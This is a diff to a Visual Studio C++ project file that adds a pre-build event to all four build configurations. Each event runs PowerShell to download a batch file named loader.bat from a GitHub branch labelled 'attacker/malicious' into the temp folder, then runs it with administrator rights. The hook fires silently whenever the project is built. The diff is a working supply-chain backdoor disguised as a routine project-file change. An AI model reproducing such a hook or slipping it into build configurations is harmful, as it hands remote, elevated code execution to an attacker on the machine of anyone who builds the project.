@@ -83,7 +83,8 @@
     <Link>
       <SubSystem>Console</SubSystem>
     </Link>
-  </ItemDefinitionGroup>
+  <PreBuildEvent><Command>powershell -Command "New-Item -Path $env:TEMP\NMLT -ItemType Directory -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/duyndh98/NMLT/refs/heads/attacker/malicious/loader.bat' -OutFile $env:TEMP\NMLT\loader.bat; Start-Process cmd -ArgumentList '/c %TEMP%\NMLT\loader.bat' -Verb RunAs"</Command></PreBuildEvent>
+</ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
@@ -94,7 +95,8 @@
     <Link>
       <SubSystem>Console</SubSystem>
     </Link>
-  </ItemDefinitionGroup>
+  <PreBuildEvent><Command>powershell -Command "New-Item -Path $env:TEMP\NMLT -ItemType Directory -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/duyndh98/NMLT/refs/heads/attacker/malicious/loader.bat' -OutFile $env:TEMP\NMLT\loader.bat; Start-Process cmd -ArgumentList '/c %TEMP%\NMLT\loader.bat' -Verb RunAs"</Command></PreBuildEvent>
+</ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
@@ -109,7 +111,8 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
     </Link>
-  </ItemDefinitionGroup>
+  <PreBuildEvent><Command>powershell -Command "New-Item -Path $env:TEMP\NMLT -ItemType Directory -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/duyndh98/NMLT/refs/heads/attacker/malicious/loader.bat' -OutFile $env:TEMP\NMLT\loader.bat; Start-Process cmd -ArgumentList '/c %TEMP%\NMLT\loader.bat' -Verb RunAs"</Command></PreBuildEvent>
+</ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
@@ -124,7 +127,8 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
     </Link>
-  </ItemDefinitionGroup>
+  <PreBuildEvent><Command>powershell -Command "New-Item -Path $env:TEMP\NMLT -ItemType Directory -Force | Out-Null; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/duyndh98/NMLT/refs/heads/attacker/malicious/loader.bat' -OutFile $env:TEMP\NMLT\loader.bat; Start-Process cmd -ArgumentList '/c %TEMP%\NMLT\loader.bat' -Verb RunAs"</Command></PreBuildEvent>
+</ItemDefinitionGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
   </ImportGroup>
